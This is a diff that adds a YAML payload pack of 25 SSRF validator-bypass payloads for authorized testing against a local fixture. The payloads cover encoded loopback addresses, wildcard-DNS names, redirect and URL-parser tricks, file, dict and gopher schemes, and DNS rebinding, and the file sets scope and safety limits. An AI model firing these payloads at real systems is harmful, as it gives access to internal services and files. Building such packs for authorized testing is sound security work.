@@ -1,0 +1,349 @@
+# SSRF payload pack — AUTHORIZED TARGETS ONLY
+#
+# Every entry is an active payload. Use it only against a host named in scope.md,
+# preferably the local fixture at 127.0.0.1. Placeholders in braces are filled by
+# the operator: {host} is the authorized host, {port} its port, {internal_path}
+# the documented internal endpoint and {allowed_host} an authorized redirector.
+#
+# No entry points at a live external service. The rebinding entries require a
+# local simulation; the gopher entry is deliberately marked non-interactive.
+meta:
+  version: 1
+  purpose: Authorized SSRF verification and evidence collection
+  active: true
+  authorized_only: true
+  default_scheme: http
+  authorized_hosts: [127.0.0.1, localhost, "::1"]
+  placeholders: [host, port, internal_path, allowed_host, ipv6_dash, rebind_host]
+  safety:
+    - Active payloads; authorized targets only.
+    - Local fixture metadata or internal endpoint only.
+    - One internal destination per test; no port scanning.
+    - Never contact a real cloud metadata service, rebinding provider or third party.
+    - Redact tokens and internal paths that are not needed for proof.
+
+payloads:
+  - id: SSRF-P01
+    technique: loopback-literal
+    representation: IPv4 dotted decimal
+    value: "http://127.0.0.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names 127.0.0.1; direct loopback request is the blocked control"
+    expected_signal: "Internal body or distinctive internal header"
+    evidence: "Fetch request, status and minimum internal response excerpt"
+    stop_condition: "First internal read"
+    notes: "Baseline control; a fetcher that allows this needs no bypass."
+
+  - id: SSRF-P02
+    technique: loopback-name
+    representation: localhost name
+    value: "http://localhost:{port}{internal_path}"
+    resolves_to: "127.0.0.1 or ::1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names localhost"
+    expected_signal: "Internal body or distinctive internal header"
+    evidence: "Fetch request, status and resolver answer"
+    stop_condition: "First internal read"
+    notes: "A blocklist may cover 127.0.0.1 but forget the name."
+
+  - id: SSRF-P03
+    technique: loopback-any
+    representation: unspecified address
+    value: "http://0.0.0.0:{port}{internal_path}"
+    resolves_to: "Local host on many stacks"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host"
+    expected_signal: "Internal body or connection success"
+    evidence: "Fetch request and observed status"
+    stop_condition: "First internal read"
+    notes: "Behavior is stack-dependent; treat a connection as the signal."
+
+  - id: SSRF-P04
+    technique: loopback-ipv6
+    representation: bracketed IPv6 literal
+    value: "http://[::1]:{port}{internal_path}"
+    resolves_to: "::1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names ::1 or the local host"
+    expected_signal: "Internal body over IPv6"
+    evidence: "Fetch request and status"
+    stop_condition: "First internal read"
+    notes: "Validators that only parse IPv4 miss IPv6."
+
+  - id: SSRF-P05
+    technique: loopback-short
+    representation: abbreviated IPv4
+    value: "http://127.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, status and resolver answer"
+    stop_condition: "First internal read"
+    notes: "Short forms are accepted by many resolvers and HTTP clients."
+
+  - id: SSRF-P06
+    technique: ip-encoding
+    representation: decimal integer
+    value: "http://2130706433:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host; verify the integer maps to loopback"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, status and normalized address"
+    stop_condition: "First internal read"
+    notes: "32-bit integer form of 127.0.0.1."
+
+  - id: SSRF-P07
+    technique: ip-encoding
+    representation: octal dotted
+    value: "http://0177.0.0.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, status and normalized address"
+    stop_condition: "First internal read"
+    notes: "Leading-zero octets are interpreted as octal by some parsers."
+
+  - id: SSRF-P08
+    technique: ip-encoding
+    representation: hex dotted
+    value: "http://0x7f.0.0.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, status and normalized address"
+    stop_condition: "First internal read"
+    notes: "Mixed-radix forms are common validator blind spots."
+
+  - id: SSRF-P09
+    technique: ip-encoding
+    representation: hex integer
+    value: "http://0x7f000001:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "scope.md names the local host"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, status and normalized address"
+    stop_condition: "First internal read"
+    notes: "Hex integer form."
+
+  - id: SSRF-P10
+    technique: wildcard-dns
+    representation: nip.io dotted
+    value: "http://127.0.0.1.nip.io:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Resolver maps the name to loopback; captured offline"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, resolver answer and status"
+    stop_condition: "First internal read"
+    notes: "Static wildcard mapping; no external target is contacted."
+
+  - id: SSRF-P11
+    technique: wildcard-dns
+    representation: nip.io dash
+    value: "http://127-0-0-1.nip.io:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Resolver maps the name to loopback; captured offline"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, resolver answer and status"
+    stop_condition: "First internal read"
+    notes: "Primary bypass for a literal 127.0.0.1 substring blocklist."
+
+  - id: SSRF-P12
+    technique: wildcard-dns
+    representation: sslip.io dash
+    value: "http://127-0-0-1.sslip.io:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Resolver maps the name to loopback; captured offline"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, resolver answer and status"
+    stop_condition: "First internal read"
+    notes: "Alternate wildcard provider; same mapping rule."
+
+  - id: SSRF-P13
+    technique: wildcard-dns
+    representation: IPv6 dash form
+    value: "http://{ipv6_dash}.nip.io:{port}{internal_path}"
+    resolves_to: "Configured IPv6 loopback form"
+    active: true
+    authorized_only: true
+    prerequisites: "Provider-specific IPv6 form verified offline"
+    expected_signal: "Internal body over IPv6"
+    evidence: "Fetch request, resolver answer and status"
+    stop_condition: "First internal read"
+    notes: "Form varies by provider; do not guess and do not scan."
+
+  - id: SSRF-P14
+    technique: ipv6-mapped
+    representation: IPv4-mapped IPv6
+    value: "http://[::ffff:127.0.0.1]:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Stack accepts IPv4-mapped literals"
+    expected_signal: "Internal body"
+    evidence: "Fetch request and status"
+    stop_condition: "First internal read"
+    notes: "A regex that only matches 127.0.0.1 misses the mapped form."
+
+  - id: SSRF-P15
+    technique: redirect
+    representation: 302 from allowed host
+    value: "http://{allowed_host}/go?next=http%3A%2F%2F127.0.0.1%3A{port}{internal_path}"
+    resolves_to: "127.0.0.1 after one hop"
+    active: true
+    authorized_only: true
+    prerequisites: "Authorized redirect route on the fixture"
+    expected_signal: "Internal body after the redirect"
+    evidence: "Fetch request, redirect chain and final body excerpt"
+    stop_condition: "First internal read; maximum two hops"
+    notes: "Validators that check only the first URL are bypassed."
+
+  - id: SSRF-P16
+    technique: redirect
+    representation: scheme-relative Location
+    value: "http://{allowed_host}/go?next=//127.0.0.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1 after one hop"
+    active: true
+    authorized_only: true
+    prerequisites: "Authorized redirect route that accepts a scheme-relative target"
+    expected_signal: "Internal body after the redirect"
+    evidence: "Fetch request, Location header and final body excerpt"
+    stop_condition: "First internal read"
+    notes: "Scheme-relative targets defeat prefix checks."
+
+  - id: SSRF-P17
+    technique: redirect
+    representation: 307 method-preserving hop
+    value: "http://{allowed_host}/go?next=http%3A%2F%2F127.0.0.1%3A{port}{internal_path}"
+    resolves_to: "127.0.0.1 after one hop"
+    active: true
+    authorized_only: true
+    prerequisites: "Redirect route supports 307"
+    expected_signal: "Internal body or method-preserving internal effect"
+    evidence: "Fetch request, redirect chain and final status"
+    stop_condition: "First internal read"
+    notes: "Use only when a 302 is blocked but 307 is followed."
+
+  - id: SSRF-P18
+    technique: parser-trick
+    representation: userinfo
+    value: "http://{allowed_host}@127.0.0.1:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Validator parses the host incorrectly"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, parsed host and status"
+    stop_condition: "First internal read"
+    notes: "The real host follows the at-sign; a naive trusted-host match can be fooled."
+
+  - id: SSRF-P19
+    technique: parser-trick
+    representation: backslash
+    value: "http://127.0.0.1\\@{allowed_host}:{port}{internal_path}"
+    resolves_to: "Client-dependent"
+    active: true
+    authorized_only: true
+    prerequisites: "Validator and client disagree on backslash handling"
+    expected_signal: "Internal body or client error that reveals the parsed host"
+    evidence: "Fetch request, parser behavior and status"
+    stop_condition: "First internal read"
+    notes: "Only meaningful when the validator is known to accept backslashes."
+
+  - id: SSRF-P20
+    technique: parser-trick
+    representation: percent-encoded host
+    value: "http://127%2e0%2e0%2e1:{port}{internal_path}"
+    resolves_to: "127.0.0.1 where decoding happens before resolution"
+    active: true
+    authorized_only: true
+    prerequisites: "Client decodes the host before connecting"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, decoded host and status"
+    stop_condition: "First internal read"
+    notes: "Do not stack encodings; one form per request."
+
+  - id: SSRF-P21
+    technique: parser-trick
+    representation: trailing dot
+    value: "http://127.0.0.1.:{port}{internal_path}"
+    resolves_to: "127.0.0.1"
+    active: true
+    authorized_only: true
+    prerequisites: "Resolver accepts a trailing root dot"
+    expected_signal: "Internal body"
+    evidence: "Fetch request, resolver answer and status"
+    stop_condition: "First internal read"
+    notes: "A canonical-name check that does not strip the dot can be bypassed."
+
+  - id: SSRF-P22
+    technique: protocol
+    representation: file scheme
+    value: "file:///tmp/sak-ssrf-proof.txt"
+    resolves_to: "Local fixture proof file"
+    active: true
+    authorized_only: true
+    prerequisites: "Operator creates the proof file locally; fetcher accepts file"
+    expected_signal: "Contents of the fixture proof file"
+    evidence: "Fetch request and file content excerpt"
+    stop_condition: "First file read; one known fixture file only"
+    notes: "Never read /etc/passwd, cloud credentials or user documents."
+
+  - id: SSRF-P23
+    technique: protocol
+    representation: dict scheme
+    value: "dict://127.0.0.1:{port}/"
+    resolves_to: "Local fixture service"
+    active: true
+    authorized_only: true
+    prerequisites: "Fetcher accepts dict; target is the fixture"
+    expected_signal: "Protocol banner or connection behavior"
+    evidence: "Fetch request and status"
+    stop_condition: "First protocol acceptance"
+    notes: "Prove scheme acceptance only; do not interact further."
+
+  - id: SSRF-P24
+    technique: protocol
+    representation: gopher scheme
+    value: "gopher://127.0.0.1:{port}/_"
+    resolves_to: "Local fixture service"
+    active: true
+    authorized_only: true
+    prerequisites: "Fetcher accepts gopher; fixture service is stateless"
+    expected_signal: "Scheme acceptance, not a service interaction"
+    evidence: "Fetch request and status"
+    stop_condition: "First scheme acceptance; never send a stateful command"
+    notes: "Do not use gopher against Redis, SMTP, HTTP admin paths or any stateful service."
+
+  - id: SSRF-P25
+    technique: dns-rebinding
+    representation: local simulation
+    value: "http://{rebind_host}:{port}{internal_path}"
+    resolves_to: "Allowed address at validation, loopback at connect"
+    active: true
+    authorized_only: true
+    prerequisites: "Fixture provides a deterministic local rebinding simulation"
+    expected_signal: "Internal body, or resolver evidence of different answers"
+    evidence: "Resolver answers with TTL and timestamps, fetch result"
+    stop_condition: "One attempt or one bounded window"
+    notes: "Brute intensity held in reserve. Never use a live public rebinding provider."
